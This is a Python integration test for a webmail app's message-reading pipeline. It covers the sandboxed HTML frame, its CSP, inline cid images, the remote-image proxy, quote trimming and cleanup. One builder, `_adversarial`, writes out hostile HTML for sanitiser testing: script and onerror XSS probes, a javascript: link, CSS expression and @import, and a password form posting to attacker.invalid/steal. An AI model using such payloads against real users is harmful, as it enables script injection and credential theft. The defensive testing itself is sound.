"""Phase 1B's reading pipeline, end to end, against the running stack.

`test_live_app_flow.py` proved the *list* seams — login, rows, triage,
undo, logout — against real mail in real Stalwart. This module proves the
*reading* seams, which are entirely different code and had never once been
exercised against a real message: `GET /m/{id}/html` (the sandboxed frame
document and its CSP), `GET /m/{id}/cid/{content-id}` (an inline image
served out of a real MIME part), `GET /m/{id}/frame` (the blocked-images
banner) and `GET /img?u=…` (the remote proxy's signed-token gate).

Everything under `tests/unit/` renders a body the test itself hands to the
sanitiser. Nothing there answers the question this module exists for: does
a message that went through **SMTP-shaped MIME, a JMAP import, Stalwart's
own parser and `Email/get`'s `htmlBody`/`attachments` resolution** still
arrive at the sanitiser in a shape it recognises? Three of this file's
assertions are only meaningful on that path — that `attachments` carries a
`cid` at all, that its angle brackets are stripped the way `_bare_cid`
expects, and that the blob behind it round-trips byte for byte.

**Hermetic and self-cleaning**, on the same terms as `test_live_app_flow.py`
and for the same reason: every run stamps a fresh `uuid4` into the
`Message-ID` and `Subject` of each message it imports, so two runs never
collide in Stalwart's References-based threading (a repeated `Message-ID`
folds a re-import into the *existing* thread — `docs/spikes/p0-findings.md`
SPK-6), and the `finally` destroys precisely the ids this run created and
then verifies that it did.

**Every assertion is about a message this run imported.** That is not a
style preference: `test_live_app_flow.py`'s companion test had to be fixed
once for asserting on account-wide state (how many Archive mailboxes the
account had) rather than on its own imports, which made it pass or fail
according to what previous runs had left behind. The inbox listing here is
checked for *these* subjects and never for a count; the remote-image
assertions count the hosts *this* message names; the frame assertions read
the document served for *these* ids.

Run with `make itest` (only; `pyproject.toml`'s default `addopts` deselects
`integration`), against `make up`/`make dev` plus
`bash scripts/stalwart-init.sh`.
"""

from __future__ import annotations

import base64
import json
import logging
import re
import uuid
from datetime import UTC, datetime
from email.message import EmailMessage

import httpx
import pytest

from mailosh.config import Settings
from mailosh.jmap.client import JmapClient, find_inbox
from mailosh.jmap.errors import JmapError
from mailosh.render.frame_document import FRAME_SCRIPT, csp_header
from mailosh.security.sessions import cookie_name

pytestmark = pytest.mark.integration

_log = logging.getLogger(__name__)

#: The app under test. Both compose stacks publish this on loopback;
#: nothing here starts or stops it.
APP_URL = "http://localhost:8000"

#: `<meta name="csrf-token" content="...">` from `layouts/app.html`.
_CSRF_RE = re.compile(r'<meta name="csrf-token" content="([^"]*)">')

#: An 8x8 greyscale PNG, 89 bytes. Small enough to inline here, and a real
#: PNG rather than a byte string with a `.png` name — `/m/{id}/cid/{cid}`
#: serves on the *declared* type, so a fake would prove the route works on
#: something no browser would draw.
INLINE_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAgAAAAIAQMAAAD+wSzIAAAABlBMVEX///+/v7+jQ3Y5AAAA"
    "DklEQVQI12P4AIX8EAgALgAD/aNpbtEAAAAASUVORK5CYII="
)

#: The Content-ID of that part, without the angle brackets a `cid:` URL
#: never carries. The message below writes it into the header *with*
#: brackets and into the `<img src>` without, which is exactly the
#: asymmetry RFC 2392 creates and `frames._bare_cid` exists to resolve.
INLINE_CID_LOCAL = "logo.9f2c1b@mailosh.test"

#: The two hosts the newsletter's remote images point at. Neither is
#: resolvable, and neither is ever fetched: at `remote=0` the sanitiser
#: strips the `src` before anything could, and at `remote=1` the only
#: request made is to this app's own `/img` — whose *upstream* fetch this
#: module deliberately does not exercise (`tests/unit/test_img_proxy.py`
#: and `test_fetch_guard.py` own that, against controlled servers).
REMOTE_HOSTS = ("cdn.invalid.example", "px.invalid.example")


def _app_is_up() -> bool:
    """Is the `mailosh` container actually serving? Checked once per test so
    a stack with Stalwart up but the app down skips with an honest reason
    instead of failing with a bare `ConnectError`.
    """
    try:
        return httpx.get(f"{APP_URL}/login", timeout=5.0).status_code == 200
    except httpx.HTTPError:
        return False


def _envelope(run_id: str, index: int, subject: str) -> EmailMessage:
    """The RFC 5322 headers every message in this run shares.

    The per-run id in `Message-ID` is the hermeticity guarantee; the same id
    in `Subject` is what makes the cleanup's own verification query able to
    find this run and nothing else.
    """
    msg = EmailMessage()
    msg["From"] = "reading-itest@example.test"
    msg["To"] = "demo@mailosh.test"
    msg["Subject"] = subject
    msg["Message-ID"] = f"<reading-{run_id}-{index}@mailosh.test>"
    msg["Date"] = "Thu, 03 Sep 2026 09:00:00 +0000"
    return msg


def _newsletter(run_id: str, subject: str) -> bytes:
    """A `multipart/alternative` → `multipart/related` newsletter: an HTML
    body, one inline `cid:` PNG, and two remote images on two hosts.

    Built as real MIME rather than as a flat `text/html` part because that
    nesting *is* the thing under test — an inline image only becomes an
    `attachments` entry with a `cid` after Stalwart has parsed a
    `multipart/related`, and a flat body would exercise none of it.
    """
    msg = _envelope(run_id, 0, subject)
    msg.set_content(f"Plain-text alternative for {subject}.\n")
    msg.add_alternative(
        "<html><body>"
        '<table role="presentation" width="600" cellpadding="0" cellspacing="0"'
        ' bgcolor="#ffffff" style="width:600px;border-collapse:collapse">'
        '<tr><td style="padding:24px 32px;font-family:Arial,sans-serif;font-size:15px">'
        f'<img src="cid:{INLINE_CID_LOCAL}" width="8" height="8" alt="Mark">'
        f'<h1 style="font-size:19px;color:#111111">{subject}</h1>'
        "<p>READING-BODY-VISIBLE: the reconciliation moved September by four percent.</p>"
        f'<img src="https://{REMOTE_HOSTS[0]}/hero.png" width="600" height="120" alt="Hero">'
        '<p><a href="https://example.test/unsubscribe">Unsubscribe</a></p>'
        "</td></tr></table>"
        f'<img src="https://{REMOTE_HOSTS[1]}/o.gif" width="1" height="1" alt="">'
        "</body></html>",
        subtype="html",
    )
    html_part = msg.get_payload()[1]
    html_part.add_related(
        INLINE_PNG,
        maintype="image",
        subtype="png",
        cid=f"<{INLINE_CID_LOCAL}>",
        filename="mark.png",
        disposition="inline",
    )
    return bytes(msg)


def _gmail_reply(run_id: str, subject: str) -> bytes:
    """A Gmail-shaped reply: visible text above a `.gmail_quote` wrapper.

    The quote split is a pure function tested exhaustively in
    `tests/unit/test_quote_trim.py`; what this proves is that the wrapper
    still *exists* by the time a real body has been through import, storage
    and `htmlBody` resolution — a pipeline that has collapsed whitespace and
    re-encoded entities before it reaches the sanitiser.
    """
    msg = _envelope(run_id, 1, subject)
    msg.set_content(f"Plain-text alternative for {subject}.\n")
    msg.add_alternative(
        '<div dir="ltr"><p>READING-REPLY-VISIBLE: Thursday works for me.</p></div>'
        '<div class="gmail_quote">'
        '<div dir="ltr" class="gmail_attr">'
        "On Tue, Sep 1, 2026 at 8:41 PM Dan Okafor &lt;dan@example.test&gt; wrote:<br></div>"
        '<blockquote class="gmail_quote"'
        ' style="margin:0 0 0 .8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex">'
        "<div>READING-QUOTED-HIDDEN: can you make Thursday?</div>"
        "</blockquote></div>",
        subtype="html",
    )
    return bytes(msg)


def _adversarial(run_id: str, subject: str) -> bytes:
    """One message carrying a payload from each family the sanitiser names.

    Deliberately not a fuzz corpus — that work is done, exhaustively, in
    `tests/unit/test_html_sanitize.py` and a 450 000-iteration review. This
    is the *live* question those cannot answer: whether anything in the
    import → Stalwart → `Email/get` → route path re-decodes, re-wraps or
    otherwise revives a payload the pure-function tests already kill.
    """
    msg = _envelope(run_id, 2, subject)
    msg.set_content(f"Plain-text alternative for {subject}.\n")
    msg.add_alternative(
        "<html><head>"
        '<base href="https://attacker.invalid/">'
        "<style>@import url(https://attacker.invalid/x.css);"
        'p::before{content:"\\3c /style\\3e \\3c img src=x onerror=alert(1)\\3e "}</style>'
        "</head><body>"
        "<p>READING-PAYLOAD-VISIBLE: the readable part of a hostile message.</p>"
        "<script>alert(1)</script>"
        '<img src="x" onerror="alert(2)">'
        '<a href="javascript:alert(3)">link</a>'
        '<div style="width:expression(alert(4));position:fixed;top:0">positioned</div>'
        "<svg><script>alert(5)</script></svg>"
        '<iframe srcdoc="&lt;script&gt;alert(6)&lt;/script&gt;"></iframe>'
        '<form action="https://attacker.invalid/steal">'
        '<input name="password" type="password"><button>Sign in</button></form>'
        "</body></html>",
        subtype="html",
    )
    return bytes(msg)


async def _destroy_emails(client: JmapClient, ids: list[str]) -> None:
    """Best-effort `Email/set destroy` for exactly the ids this run created.

    `client._call` directly, because `destroy` is deliberately not part of
    the `JmapClient` contract — the same call the other two integration
    modules' own cleanup helpers make. Logs and swallows a `JmapError` so a
    cleanup hiccup can never clobber a real assertion failure propagating
    through the same `finally`.
    """
    if not ids:
        return
    try:
        await client._call(
            [("Email/set", {"accountId": client.account_id, "destroy": list(ids)}, "d0")]
        )
    except JmapError:
        _log.warning("cleanup: Email/set destroy failed for %r", ids, exc_info=True)


def _csrf_token(html: str) -> str:
    match = _CSRF_RE.search(html)
    assert match is not None, "no <meta name=csrf-token> in the rendered app shell"
    token = match.group(1)
    assert token, "app shell rendered an empty CSRF token for a logged-in session"
    return token


def _img_srcs(document: str) -> list[str]:
    """Every `<img src>` in a frame document, in order.

    A regex rather than a parser on purpose: the assertions below are about
    what a *browser* would fetch, and a parser that silently repaired
    malformed markup could hide an attribute the browser would still act
    on. The frame document is machine-generated by `render_frame`, so its
    quoting is known.
    """
    return re.findall(r'<img[^>]*\ssrc="([^"]*)"', document)


async def test_reading_one_real_message_end_to_end():
    """Import three messages, read each through the running app, clean up.

    One test rather than three, because the three share an expensive setup
    (a login, an import, a JMAP connection) and, more to the point, share a
    `finally`: three tests would be three chances to leave fixtures behind
    in a shared account, which is the failure `make itest` has already been
    broken by once.
    """
    settings = Settings()
    if settings.demo_user is None or settings.demo_password is None:
        pytest.skip("MAILOSH_DEMO_USER/MAILOSH_DEMO_PASSWORD not set")
    if not _app_is_up():
        pytest.skip(f"the mailosh container is not serving {APP_URL}")

    run_id = uuid.uuid4().hex[:8]
    subjects = {
        "newsletter": f"Mailosh reading {run_id} newsletter",
        "reply": f"Mailosh reading {run_id} reply",
        "payload": f"Mailosh reading {run_id} payload",
    }

    jmap = await JmapClient.connect(
        settings.stalwart_url, settings.demo_user, settings.demo_password
    )
    email_ids: dict[str, str] = {}
    http = httpx.Client(base_url=APP_URL, timeout=30.0, follow_redirects=False)
    try:
        inbox = find_inbox(await jmap.get_mailboxes())
        for key, builder in (
            ("newsletter", _newsletter),
            ("reply", _gmail_reply),
            ("payload", _adversarial),
        ):
            blob = await jmap.upload(builder(run_id, subjects[key]), "message/rfc822")
            email_ids[key] = await jmap.import_email(blob, {inbox.id}, set(), datetime.now(UTC))
        assert len(set(email_ids.values())) == 3, (
            "each import must be its own message, not a re-thread of a previous run"
        )

        # --- Stalwart's own view of the inline part -----------------------
        # Asserted before the app is involved at all. If this is wrong,
        # every `cid:` assertion below would fail for a reason that has
        # nothing to do with the code this phase wrote.
        stored = await jmap.get_thread(
            (await jmap.get_email_states([email_ids["newsletter"]]))[0].thread_id
        )
        imported = next(m for m in stored if m.id == email_ids["newsletter"])
        assert imported.html_body and "READING-BODY-VISIBLE" in imported.html_body
        inline_parts = [p for p in imported.attachments if p.cid]
        assert len(inline_parts) == 1, f"expected one cid part, got {imported.attachments!r}"
        assert inline_parts[0].cid.strip("<>") == INLINE_CID_LOCAL, (
            f"Stalwart spelled the Content-ID {inline_parts[0].cid!r}"
        )
        assert inline_parts[0].type == "image/png"

        # --- log in ------------------------------------------------------
        login = http.post(
            "/login",
            data={
                "username": settings.demo_user,
                "password": settings.demo_password,
                "next": "/mail/inbox",
            },
        )
        assert login.status_code == 303, login.text
        assert http.cookies.get(cookie_name(settings)), "login set no session cookie"

        listing = http.get("/mail/inbox")
        assert listing.status_code == 200
        for subject in subjects.values():
            assert subject in listing.text, f"{subject!r} missing from the inbox render"
        headers = {"X-CSRF-Token": _csrf_token(listing.text)}

        # --- the frame document, and its CSP ------------------------------
        frame = http.get(f"/m/{email_ids['newsletter']}/html")
        assert frame.status_code == 200, frame.text
        # Byte-identical, not "contains": the hash in the CSP pins the exact
        # script bytes, and a header assembled anywhere but `csp_header()`
        # is a second source of truth that would drift silently until a
        # browser refused the inline script.
        assert frame.headers["content-security-policy"] == csp_header()
        assert frame.headers.get("x-content-type-options") == "nosniff"
        document = frame.text
        assert "READING-BODY-VISIBLE" in document, "the message body did not reach the frame"
        assert document.lower().count("<script") == 1
        assert FRAME_SCRIPT in document
        # Layout-bearing CSS survives a real round trip, not just a unit
        # test's string: this is the newsletter's 600px column.
        assert "width:600px" in document

        # --- the inline image, through the route the frame points at ------
        cid_srcs = [src for src in _img_srcs(document) if "/cid/" in src]
        assert len(cid_srcs) == 1, f"expected one cid image in the frame, got {_img_srcs(document)}"
        assert cid_srcs[0].startswith("http"), "the cid rewrite must be absolute (nh3 behaviour 1)"
        inline = http.get(httpx.URL(cid_srcs[0]).raw_path.decode())
        assert inline.status_code == 200, inline.text
        assert inline.headers["content-type"].startswith("image/png")
        assert inline.headers.get("content-disposition") == "inline"
        assert inline.content == INLINE_PNG, "the inline part did not round-trip byte for byte"

        # A Content-ID this message does not carry is a 404, not another
        # message's part — the whole point of scoping the lookup to the
        # message the reader already opened.
        borrowed = http.get(f"/m/{email_ids['newsletter']}/cid/not-a-real-cid@mailosh.test")
        assert borrowed.status_code == 404

        # --- the remote-image gate ----------------------------------------
        remote_srcs = [src for src in _img_srcs(document) if "/cid/" not in src]
        assert remote_srcs == [], f"remote images kept a src at remote=0: {remote_srcs}"
        for host in REMOTE_HOSTS:
            assert host not in document, f"{host} survived into the frame at remote=0"

        # `thread` is required by the route: the partial renders the swap
        # target the conversation view will put it back into, and that
        # target is keyed by thread, not by message.
        thread_id = (await jmap.get_email_states([email_ids["newsletter"]]))[0].thread_id
        banner = http.get(f"/m/{email_ids['newsletter']}/frame", params={"thread": thread_id})
        assert banner.status_code == 200, banner.text
        assert "2 remote images" in banner.text, banner.text[:600]
        for host in REMOTE_HOSTS:
            assert host in banner.text, f"the banner did not name {host}"

        shown = http.get(f"/m/{email_ids['newsletter']}/html?remote=1")
        assert shown.status_code == 200
        proxied = [src for src in _img_srcs(shown.text) if "/img?u=" in src]
        assert len(proxied) == 2, f"expected two proxied images, got {_img_srcs(shown.text)}"
        for host in REMOTE_HOSTS:
            assert f"//{host}" not in shown.text, f"{host} appeared outside the proxy at remote=1"
        # The token is this reader's; a forged one is refused before any
        # fetch is attempted, which is why this asserts 403 and not 502.
        assert http.get("/img", params={"u": "not-a-token"}).status_code == 403

        # --- the quote split, live ----------------------------------------
        reply = http.get(f"/m/{email_ids['reply']}/html")
        assert reply.status_code == 200
        body = reply.text
        assert "READING-REPLY-VISIBLE" in body and "READING-QUOTED-HIDDEN" in body
        # The *button*, not the attribute name: `FRAME_SCRIPT` carries
        # `[data-mailosh-quote-toggle]` as a selector string, so matching on
        # the bare attribute would find the script and pass on a document
        # with no toggle in it at all.
        toggle = body.index('class="mailosh-quote-toggle"')
        assert body.index("READING-REPLY-VISIBLE") < toggle, "the reply was hidden behind the quote"
        assert toggle < body.index("READING-QUOTED-HIDDEN"), "the quote was not behind the toggle"
        assert "<div data-mailosh-quote hidden>" in body

        # `?expand=1` is the print page's view: same body, quote open, no
        # toggle and nothing hidden.
        expanded = http.get(f"/m/{email_ids['reply']}/html?expand=1").text
        assert "READING-QUOTED-HIDDEN" in expanded
        assert 'class="mailosh-quote-toggle"' not in expanded
        assert "<div data-mailosh-quote hidden>" not in expanded

        # --- the adversarial body, served by the real route ---------------
        hostile = http.get(f"/m/{email_ids['payload']}/html")
        assert hostile.status_code == 200
        out = hostile.text
        assert "READING-PAYLOAD-VISIBLE" in out, "a hostile message must still be readable"
        # Exactly one script — the hash-pinned resize block — and nothing
        # from any of the six payload families.
        assert out.lower().count("<script") == 1
        assert FRAME_SCRIPT in out
        for forbidden in ("alert(", "javascript:", "@import", "expression(", "<base", "<iframe"):
            assert forbidden not in out, f"{forbidden!r} survived into the frame document"
        assert not re.search(r"\son[a-z]+\s*=", out), "an on* handler survived"
        assert "attacker.invalid" not in out
        assert hostile.headers["content-security-policy"] == csp_header()

        # `/source` hands back the raw message the reader asked to see, as
        # inert text — the one place the payload is *supposed* to appear.
        source = http.get(f"/m/{email_ids['payload']}/source")
        assert source.status_code == 200
        assert source.headers["content-type"].startswith("text/plain")
        assert "alert(1)" in source.text, "show-original served something other than the source"

        # --- archive one, undo it, log out --------------------------------
        archived = http.post("/a/archive", data={"ids": [email_ids["reply"]]}, headers=headers)
        assert archived.status_code == 204, archived.text
        undo_token = json.loads(archived.headers["hx-trigger"])["om:done"]["undo"]
        assert undo_token, "archive handed back no undo token"
        assert inbox.id not in set(
            (await jmap.get_email_states([email_ids["reply"]]))[0].mailbox_ids
        )
        undone = http.post("/a/undo", data={"token": undo_token}, headers=headers)
        assert undone.status_code == 204, undone.text
        assert inbox.id in set((await jmap.get_email_states([email_ids["reply"]]))[0].mailbox_ids)

        logout = http.post("/logout", headers=headers)
        assert logout.status_code == 303
        closed = http.get(f"/m/{email_ids['newsletter']}/html")
        assert closed.status_code in (303, 401), (
            f"a signed-out session still read a frame: {closed.status_code}"
        )
    finally:
        http.close()
        try:
            await _destroy_emails(jmap, list(email_ids.values()))
            # Self-verify the cleanup. A run that leaves its own fixtures
            # live is exactly the failure that broke `make itest` for SPK-2,
            # and it is silent unless something looks.
            if email_ids:
                leftover = await jmap._call(
                    [
                        (
                            "Email/query",
                            {
                                "accountId": jmap.account_id,
                                "filter": {"subject": f"Mailosh reading {run_id}"},
                                "calculateTotal": True,
                                "limit": 0,
                            },
                            "q0",
                        )
                    ]
                )
                assert leftover["q0"]["total"] == 0, (
                    f"cleanup left {leftover['q0']['total']} message(s) of run {run_id} live"
                )
        finally:
            await jmap.close()
